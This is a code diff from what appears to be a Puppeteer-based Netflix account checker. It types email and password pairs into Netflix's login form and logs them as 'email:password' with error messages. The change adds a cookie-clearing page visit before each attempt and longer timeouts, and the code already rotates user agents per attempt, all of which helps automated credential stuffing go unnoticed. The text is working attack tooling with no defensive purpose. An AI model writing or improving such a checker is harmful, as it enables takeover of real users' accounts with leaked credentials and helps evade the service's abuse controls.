@@ -38,12 +38,19 @@ const checkCredentials = async ({
         })\n${email}:${password}\nError: ${error_count}\nMessage: \`${error_message}\``
       );
 
+      const clearCookiesPage = await browser.newPage();
+      await clearCookiesPage.goto("https://netflix.com/clearcookies", {
+        waitUntil: "networkidle0",
+        timeout: 15000
+      });
+      await clearCookiesPage.close();
+
       const page = await browser.newPage();
 
       await page.setUserAgent(getUserAgent());
       await page.goto(URL, {
         waitUntil: "networkidle0",
-        timeout: 10000
+        timeout: 15000
       });
       await page.focus("input[id=id_userLoginId]");
       await page.keyboard.type(email);
